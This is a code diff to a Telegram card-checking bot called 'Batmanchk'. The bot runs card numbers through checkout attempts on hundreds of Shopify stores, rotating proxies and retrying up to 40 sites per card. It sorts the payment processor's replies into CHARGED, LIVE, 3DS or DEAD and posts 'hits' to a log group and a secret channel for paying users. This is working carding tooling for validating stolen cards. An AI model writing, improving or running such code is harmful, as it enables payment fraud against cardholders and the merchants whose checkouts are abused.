@@ -52,13 +52,7 @@ from telegram.ext import CommandHandler, CallbackQueryHandler, ContextTypes
 from config import (
     OWNER_ID,
     get_bin_info, tg_emoji,
-    get_plan_emoji_id, get_random_live_emoji,
     RawMarkup, _btn,
-    CARD_EMOJI_ID, USER_EMOJI_ID, TIME_EMOJI_ID,
-    DEV_EMOJI_ID, PRO_EMOJI_ID,
-    PROG_GATE_EMOJI_ID, PROG_PROGRESS_EMOJI_ID, PROG_CHARGED_EMOJI_ID,
-    PROG_LIVE_EMOJI_ID, PROG_DEAD_EMOJI_ID, PROG_ERRORS_EMOJI_ID,
-    LIVE_EMOJI_IDS, PLAN_EMOJIS, SPECIAL_FONT_MAP,
     BOT_NAME, CHANNEL_LINK,
 )
 
@@ -78,7 +72,7 @@ SECRET_CHANNEL_LINK = "https://t.me/+86iK7fXMWEY2MGRk"
 BTN_LABEL           = "⚡ Batmanchk"      # button shown on all result cards
 
 SH_COOLDOWN    = 25
-SITE_RETRIES   = 20    # sites tried per card (keep trying until CHARGED/LIVE/TDS or exhausted)
+SITE_RETRIES   = 40    # sites tried per card — matches msh.py MAX_RETRIES
 SITE_TIMEOUT   = 12    # live sites respond in 7-8s; must be above that
 MAX_CONCURRENT = 15    # cards checked in parallel
 CARD_STAGGER   = 0.3   # stagger between card launches (seconds)
@@ -102,16 +96,37 @@ PROBE_TIMEOUT:      float = 12.0
 PROBE_CONCURRENCY:  int   = 60
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# EMOJI IDS
+# EMOJI IDS  — full set from mst.py (custom premium stickers)
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-LIVE_EMOJI_ID     = "4958610528588008305"
+
+# Core card/user/time emojis
+CARD_EMOJI_ID     = "5800709991627232190"
+USER_EMOJI_ID     = "4958689671950369798"
+TIME_EMOJI_ID     = "5382194935057372936"
+DEV_EMOJI_ID      = "6267091732861555879"
+PRO_EMOJI_ID      = "6298678524379137990"
+
+# Status emojis
 DECLINED_EMOJI_ID = "4956612582816351459"
+
+# Hit-log emojis
 HIT_GATE_EMOJI_ID = "5341715473882955310"
 HIT_RESP_EMOJI_ID = "5839116473951328489"
+
+# Progress-message emojis
+PROG_GATE_EMOJI_ID     = "5341715473882955310"
+PROG_PROGRESS_EMOJI_ID = "5258113901106580375"
+PROG_CHARGED_EMOJI_ID  = "5427168083074628963"
+PROG_LIVE_EMOJI_ID     = "5427168083074628963"
+PROG_DEAD_EMOJI_ID     = "4958526153955476488"
+PROG_ERRORS_EMOJI_ID   = "4956611513369494230"
+
+# Button emojis
 BTN_LIVE_EMOJI_ID = "5039793437776282663"
 BTN_ALL_EMOJI_ID  = "4956324463525233747"
 BTN_STOP_EMOJI_ID = "6179444193518162239"
 
+# Pool of 18 premium animated emojis — used for CHARGED and LIVE hits (random per card)
 CHARGED_EMOJI_IDS = [
     "5801154993188770160", "4956739572114392015", "5285221724634239278",
     "5287777298894835685", "5285024405246725814", "5287547831677112267",
@@ -120,6 +135,50 @@ CHARGED_EMOJI_IDS = [
     "5801005158959683238", "5436143465211640305", "5800688138833629633",
     "5891044423856296980", "5436068999068662274", "5427168083074628963",
 ]
+
+# LIVE_EMOJI_IDS is the same pool — mst.py uses this name for LIVE hits
+LIVE_EMOJI_IDS = CHARGED_EMOJI_IDS
+
+# Plan emojis (CORE / ELITE / ROOT / CUSTOM)
+PLAN_EMOJIS = {
+    "CORE":   "5379869575338812919",
+    "ELITE":  "5836898273666798437",
+    "ROOT":   "4956420911310832630",
+    "CUSTOM": "5445027583588593750",
+}
+
+# Small-caps → uppercase map for plan name normalisation
+SPECIAL_FONT_MAP = {
+    'ᴀ': 'A', 'ʙ': 'B', 'ᴄ': 'C', 'ᴅ': 'D', 'ᴇ': 'E',
+    'ꜰ': 'F', 'ɢ': 'G', 'ʜ': 'H', 'ɪ': 'I', 'ᴊ': 'J',
+    'ᴋ': 'K', 'ʟ': 'L', 'ᴍ': 'M', 'ɴ': 'N', 'ᴏ': 'O',
+    'ᴘ': 'P', 'ǫ': 'Q', 'ʀ': 'R', 'ꜱ': 'S', 'ᴛ': 'T',
+    'ᴜ': 'U', 'ᴠ': 'V', 'ᴡ': 'W', 'x': 'X', 'ʏ': 'Y',
+    'ᴢ': 'Z', 'Ɪ': 'I',
+}
+
+
+def get_random_charged_emoji() -> str:
+    """Random premium emoji for CHARGED hits."""
+    return random.choice(CHARGED_EMOJI_IDS)
+
+
+def get_random_live_emoji() -> str:
+    """Random premium emoji for LIVE / TDS hits — same pool as mst.py."""
+    return random.choice(LIVE_EMOJI_IDS)
+
+
+def get_plan_emoji_id(plan_name: str) -> str:
+    """Return the premium plan emoji ID for a given plan name."""
+    if not plan_name:
+        return PRO_EMOJI_ID
+    norm = "".join(SPECIAL_FONT_MAP.get(c, c.upper()) for c in plan_name)
+    if norm in PLAN_EMOJIS:
+        return PLAN_EMOJIS[norm]
+    for k, v in PLAN_EMOJIS.items():
+        if k in norm:
+            return v
+    return PRO_EMOJI_ID
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 # 672 SITES FROM sites.txt — embedded so the bot always has them
@@ -801,26 +860,44 @@ BUILTIN_SITES = [
 ]
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# RESPONSE CLASSIFICATION  (ported from sitechk.py)
+# RESPONSE CLASSIFICATION  — exact match to msh.py logic
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# DEAD_ERRORS = site/infrastructure errors → skip this site, try another
-# A site that returns any of these is broken/unsupported — not a bank response.
-DEAD_ERRORS = [
+# RETRY_ERRORS = site/infrastructure errors → skip this site, try another
+# These are NOT bank responses — the site itself is broken/unsupported.
+RETRY_ERRORS = [
+    'r4 token empty', 'payment method is not shopify!', 'r2 id empty',
+    'product not found', 'hcaptcha detected', 'tax ammount empty',
+    'del ammount empty', 'product id is empty', 'py id empty',
+    'clinte token', 'hcaptcha_detected', 'receipt_empty', 'na', 'DELIVERY_ZONE_NOT_FOUND',
+    'site error! status: 429', 'site requires login!', 'failed to get token',
+    'no valid products', 'not shopify!', 'site not supported for now!', 'VALIDATION_CUSTOM',
+    'connection error', 'connection error!', 'error processing card',
+    '504', 'server error', 'client error', 'failed', 'BUYER_IDENTITY_CURRENCY_NOT_SUPPORTED_BY_SHOP',
+    'token not found', 'invalid_response', 'resolve', 'item', 'curl error',
+    'PAYMENTS_CREDIT_CARD_BRAND_NOT_SUPPORTED', 'could not resolve host',
+    'connect tunnel failed', 'timeout', 'proxy error',
+    'step 0 failed', 'step 1 failed', 'step 2 failed', 'step 3 failed',
+    'step 4 failed', 'step 5 failed', 'step 6 failed', 'step 7 failed',
+    'step 8 failed', 'step 9 failed', 'step 10 failed',
+    'SESSION_ERROR', 'DELIVERY_NO_DELIVERY_STRATEGY_AVAILABLE',
+    'DELIVERY_ZONE_NOT_FOUND', 'DELIVERY_DELIVERY_LINE_DETAIL_CHANGED',
+    'DELIVERY_NO_DELIVERY_STRATEGY_AVAILABLE_FOR_MERCHANDISE_LINE',
+    'DELIVERY_STRATEGY_CONDITIONS_NOT_SATISFIED',
+    'no available products found', 'could not extract receiptid',
+    'BUYER_IDENTITY_MARKETING_CONSENT_PHONE_NUMBER_DOES_NOT_MATCH_EXPECTED_PATTERN',
+    'could not extract signedhandles', 'receiptid missing',
+    'response missing receiptid', 'INVENTORY_FAILURE',
+    'products.json', 'returned status 429', 'returned status 500',
+    'returned status 502', 'returned status 503', 'returned status 504',
+    'store incompatible', 'extract signedHandles', 'missing receiptId',
+    'NO_PRODUCTS', 'NO_PRODUCT', 'VAULT_FAILED', 'MERCHANDISE_OUT_OF_STOCK',
     'site error! status: 404', 'site error! status: 500', 'site error! status: 402',
     'site error! status: 502', 'site error! 503', 'site error! status: 503',
-    'site not supported for now!', 'connection error', 'connection error!',
-    'error processing card', 'failed to get token', 'failed to get checkout',
-    'failed to add to cart', 'site overloaded', 'site rate limited',
-    'delivery_delivery_line_detail_changed',
-    'failed to get session token', 'unable to get payment token', 'no valid products',
-    'site error! status: 403', 'payment method is not shopify!', 'not shopify!',
-    'site error! status: 401', 'site requires login!', 'validation_custom',
-    'timeout', 'http error', 'json', 'proxy', 'curl error', 'could not resolve',
-    'connect tunnel failed', 'max retries', 'amount_too_small',
-    'buyer_identity_marketing_consent_phone_number_does_not_match_expected_pattern',
-    # Step failures (Site Broken/Dead)
-    'step 1 failed', 'step 0 failed', 'step 2 failed', 'step 3 failed', 'step 4 failed',
-    'step 5 failed', 'step 6 failed', 'step 7 failed', 'step 9 failed', 'step 10 failed',
+    'site error! status: 403', 'site error! status: 401',
+    'site not supported for now!', 'site not supported', 'site error',
+    'failed to get checkout', 'failed to add to cart', 'site overloaded', 'site rate limited',
+    'delivery_delivery_line_detail_changed', 'failed to get session token',
+    'unable to get payment token', 'validation_custom', 'http error',
     'missing stableid', 'missing buildid', 'missing sourcetoken', 'checkout_failed',
     'delivery_out_of_stock_at_origin_location',
     'could not extract private_access_token', 'no_products',
@@ -835,14 +912,23 @@ DEAD_ERRORS = [
     'could not extract session id', 'payments_credit_card_brand_not_supported',
     'could not extract delivery handle', 'could not extract signedhandles',
     'could not extract shipping amount', 'could not extract total amount',
-    'could not extract receiptid', 'could not extract sessiontoken',
-    'errstoreincompatible', 'errmissingreceiptid',
+    'could not extract sessiontoken', 'errstoreincompatible', 'errmissingreceiptid',
     'application not found', 'store not found', 'app not found',
-    'site not supported', 'site error',
 ]
 
-# SUCCESS_RESPONSES = real bank decline responses → site IS alive, card result is real
-# NOTE: GENERIC_ERROR is a success response (site alive) — not a dead-site error!
+# DECLINED_RESPONSES = real bank hard-decline → card is dead, stop checking
+DECLINED_RESPONSES = [
+    'CARD_DECLINED', 'PROCESSING_ERROR', 'GENERIC_DECLINE',
+    'DO NOT HONOR', 'DO_NOT_HONOR', 'UNKNOWN_ERROR', 'Processing Error',
+    'PICK_UP_CARD', 'DECISION_RULE_BLOCK', 'FRAUD_SUSPECTED',
+    'INVALID_PURCHASE_TYPE', 'INVALID_PAYMENT_METHOD', 'TEST_MODE_LIVE_CARD',
+    'AMOUNT_TOO_SMALL', 'INCORRECT_NUMBER', 'EXPIRED_CARD',
+    'CALL_ISSUER', 'STOLEN_CARD', 'LOST_CARD', 'RESTRICTED_CARD',
+    'TRANSACTION_NOT_ALLOWED',
+]
+
+# Keep old names as aliases so probe functions still work
+DEAD_ERRORS     = RETRY_ERRORS
 SUCCESS_RESPONSES = [
     'CARD_DECLINED', 'INVALID_CVC', 'INCORRECT_CVV', 'INSUFFICIENT_FUNDS',
     'GENERIC_ERROR', 'GENERIC_DECLINE', 'DO NOT HONOR', 'UNKNOWN_ERROR',
@@ -858,9 +944,9 @@ SUCCESS_RESPONSES = [
 
 
 def _is_dead_site_response(resp: str) -> bool:
-    """True if the response is a site/infrastructure error (not a bank response)."""
+    """True if the response is a site/infrastructure error (should retry another site)."""
     r = resp.lower().strip()
-    return any(err.lower() in r for err in DEAD_ERRORS)
+    return any(err.lower() in r for err in RETRY_ERRORS)
 
 
 def _is_success_response(resp: str) -> bool:
@@ -871,54 +957,42 @@ def _is_success_response(resp: str) -> bool:
 
 def classify_response(resp: str) -> str:
     """
-    Classify a REAL bank response (only call this after _is_dead_site_response = False).
-    Returns: CHARGED | TDS | LIVE | DEAD
+    Classify API response — exact msh.py logic.
+    Returns: CHARGED | TDS | LIVE | DEAD | RETRY | ERROR
+      CHARGED/TDS/LIVE/DEAD → stop checking this card (final verdict)
+      RETRY                 → site/infra error, try a different site
+      ERROR                 → unknown response, try a different site
     """
     if not resp:
-        return "DEAD"
+        return "RETRY"
     mu = resp.upper().strip()
+    ml = resp.lower().strip()
 
     # ── CHARGED (real money moved) ───────────────────────────────────────────
-    if any(k in mu for k in (
-        "ORDER_PAID", "PAYMENT_AUTHORIZED", "PAYMENT_ACCEPTED",
-        "APPROVED", "CHARGED", "SUCCESSFUL",
-    )):
+    if "ORDER_PAID" in mu or "CHARGED" in mu:
         return "CHARGED"
 
     # ── TDS (3-D Secure redirect) ────────────────────────────────────────────
-    if any(k in mu for k in (
-        "3DS_REQUIRED", "3D_SECURE", "AUTHENTICATION_REQUIRED",
-        "SECURE_AUTHENTICATION", "SCA_REQUIRED", "REDIRECT_3D",
-        "3DS", "3D SECURE",
-    )):
+    if "3DS_REQUIRED" in mu:
         return "TDS"
 
-    # ── LIVE (card is real — bank gave a proper decline) ────────────────────
-    if any(k in mu for k in (
-        "INSUFFICIENT_FUNDS", "INSUFFICIENT FUNDS",
-        "INCORRECT_CVV", "INCORRECT_CVC", "INVALID_CVC",
-        "INCORRECT_ZIP", "CVV_FAILED", "CVC_FAILED",
-        "DO_NOT_HONOR", "DO NOT HONOR",
-        "SECURITY_VIOLATION", "SECURITY VIOLATION",
-    )):
+    # ── LIVE (card valid — bank gave a real soft-decline) ───────────────────
+    if ("INSUFFICIENT_FUNDS" in mu or "INCORRECT_CVV" in mu
+            or "INCORRECT_CVC" in mu or "INCORRECT_ZIP" in mu):
         return "LIVE"
 
-    # ── DEAD (card is bad / bank hard-declined) ──────────────────────────────
-    if any(k in mu for k in (
-        "CARD_DECLINED", "GENERIC_DECLINE", "GENERIC_ERROR",
-        "DECLINED", "PROCESSING_ERROR", "FRAUD_SUSPECTED",
-        "DECISION_RULE_BLOCK", "PICK_UP_CARD",
-        "INVALID_PURCHASE_TYPE", "INVALID_PAYMENT_METHOD",
-        "TRANSACTION_NOT_ALLOWED", "RESTRICTED_CARD",
-        "STOLEN_CARD", "LOST_CARD", "EXPIRED_CARD",
-        "INCORRECT_NUMBER", "AMOUNT_TOO_SMALL",
-        "CALL_ISSUER", "TEST_MODE_LIVE_CARD", "UNKNOWN_ERROR",
-        "PROCESSING ERROR",
-    )):
+    # ── DEAD (bank hard-declined — card is genuinely bad) ───────────────────
+    if "GENERIC_ERROR" in mu:
+        return "DEAD"
+    if any(d.upper() in mu for d in DECLINED_RESPONSES):
         return "DEAD"
 
-    # Unknown response — treat as dead
-    return "DEAD"
+    # ── RETRY (site/infra error — try a different site) ─────────────────────
+    if any(r.lower() in ml for r in RETRY_ERRORS):
+        return "RETRY"
+
+    # Unknown — try another site
+    return "ERROR"
 
 
 def _clean_resp(resp: str) -> str:
@@ -1306,17 +1380,8 @@ async def _check_card_with_retry(
     random.shuffle(pool)
     px_pool = list(proxies) if proxies else list(_ALL_PROXIES)
     tried: set        = set()
-    price, currency   = "0.00", "USD"
-    last_resp         = "No sites responded"
-    got_bank_response = False     # True once we receive a real bank response
-
-    # Best non-DEAD result seen so far (CHARGED > TDS > LIVE beats DEAD)
-    best_verdict: str  = "DEAD"
-    best_resp:    str  = "No sites responded"
-    best_price:   str  = "0.00"
-    best_currency: str = "USD"
-
-    _RANK = {"CHARGED": 3, "TDS": 2, "LIVE": 1, "DEAD": 0}
+    price, currency = "0.00", "USD"
+    last_resp       = "No sites responded"
 
     for attempt in range(max_sites):
 
@@ -1366,44 +1431,28 @@ async def _check_card_with_retry(
             await asyncio.sleep(random.uniform(2.0, 4.0))
             continue
 
-        # ── 3. Site infrastructure error (DEAD_ERRORS) ───────────────
-        if _is_dead_site_response(resp):
-            local_dead.add(site)
-            last_resp = resp
-            logging.debug(f"[SH] Site error: {site} → {resp!r}")
-            continue
+        # ── 3. Classify response — exact msh.py logic ────────────────
+        classification = classify_response(resp)
+        last_resp      = resp
 
-        # ── 4. Real bank response → classify card ────────────────────
-        if _is_success_response(resp):
-            got_bank_response = True
-            last_resp         = resp
-            verdict           = classify_response(resp)
-            logging.info(f"[RESULT] {card[:6]}** → {verdict}  resp={resp!r}  "
-                         f"price={price}  site={site}")
+        logging.info(f"[RESULT] {card[:6]}** #{attempt+1}/{max_sites} "
+                     f"→ {classification}  resp={resp!r}  site={site}")
 
-            # Keep the best result seen so far
-            if _RANK.get(verdict, 0) > _RANK.get(best_verdict, 0):
-                best_verdict  = verdict
-                best_resp     = resp
-                best_price    = price
-                best_currency = currency
+        # CHARGED / TDS / LIVE / DEAD → final verdict, stop immediately
+        if classification in ("CHARGED", "TDS", "LIVE", "DEAD"):
+            return classification, resp, price, currency
 
-            # CHARGED / LIVE / TDS → stop immediately, winner found
-            if verdict in ("CHARGED", "LIVE", "TDS"):
-                return best_verdict, best_resp, best_price, best_currency
-
-            # DEAD from bank → keep trying other sites
-            continue
-
-        # ── 5. Unknown response — skip ────────────────────────────────
-        logging.debug(f"[SH] Unknown resp from {site}: {resp!r}")
-        last_resp = resp
+        # RETRY / ERROR → site is broken, try a different site
         local_dead.add(site)
+        if classification == "RETRY":
+            logging.debug(f"[SH] RETRY site error: {site} → {resp!r}")
+        else:
+            logging.debug(f"[SH] ERROR unknown resp: {site} → {resp!r}")
+        continue
 
-    # ── All attempts exhausted → return best result seen ─────────────
-    logging.warning(f"[SH] {card[:6]}** exhausted {max_sites} sites "
-                    f"bank_response={got_bank_response} best={best_verdict!r} last={last_resp!r}")
-    return best_verdict, best_resp, best_price, best_currency
+    # ── All attempts exhausted ────────────────────────────────────────
+    logging.warning(f"[SH] {card[:6]}** exhausted {max_sites} sites  last={last_resp!r}")
+    return "DEAD", last_resp, price, currency
 
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@@ -1638,7 +1687,7 @@ def build_result_msg(card, resp, verdict, bin_data, price, currency,
     peid     = _plan_eid(plan)
     ts       = _fmt_time(elapsed)
     bin_s    = _bin_str(bin_data)
-    ch_link  = f'<a href="{BOT_CHANNEL}">[❆]</a>'
+    ch_link  = f'<a href="{SECRET_CHANNEL_LINK}">[❆]</a>'
 
     # Sanitise display response — keep real bank text, clean site errors
     raw_resp = resp or "Unknown"
@@ -1655,14 +1704,16 @@ def build_result_msg(card, resp, verdict, bin_data, price, currency,
     safe_resp = escape(display_resp)
 
     if verdict == "CHARGED":
-        eid       = random.choice(CHARGED_EMOJI_IDS)
+        eid       = get_random_charged_emoji()
         status_ln = f'<b>{ch_link} Charged {_te(eid,"💎")}</b>'
         gate_ln   = f'<b>Gate ➳ Shopify | {_fmt_price(price, currency)}</b>'
     elif verdict == "TDS":
-        status_ln = f'<b>{ch_link} Live {_te(LIVE_EMOJI_ID,"✅")} [3DS]</b>'
+        eid       = get_random_live_emoji()
+        status_ln = f'<b>{ch_link} Live {_te(eid,"✅")} [3DS]</b>'
         gate_ln   = "<b>Gate ➳ Shopify | 0-20$</b>"
     elif verdict == "LIVE":
-        status_ln = f'<b>{ch_link} Live {_te(LIVE_EMOJI_ID,"✅")}</b>'
+        eid       = get_random_live_emoji()
+        status_ln = f'<b>{ch_link} Live {_te(eid,"✅")}</b>'
         gate_ln   = "<b>Gate ➳ Shopify | 0-20$</b>"
     else:
         status_ln = f'<b>{ch_link} Dead {_te(DECLINED_EMOJI_ID,"❌")}</b>'
@@ -1813,7 +1864,7 @@ async def _send_hit(bot, user, text: str, verdict: str, card: str = "",
     # ── 2. Public hit-log group (short summary only) ─────────────────────────
     if HIT_LOG_GROUP_ID:
         try:
-            eid   = random.choice(CHARGED_EMOJI_IDS) if verdict == "CHARGED" else LIVE_EMOJI_ID
+            eid   = get_random_charged_emoji() if verdict == "CHARGED" else get_random_live_emoji()
             label = "Charged" if verdict == "CHARGED" else "Live"
             grp   = (
                 f'<b>{_te(HIT_GATE_EMOJI_ID,"🛒")} {label} '
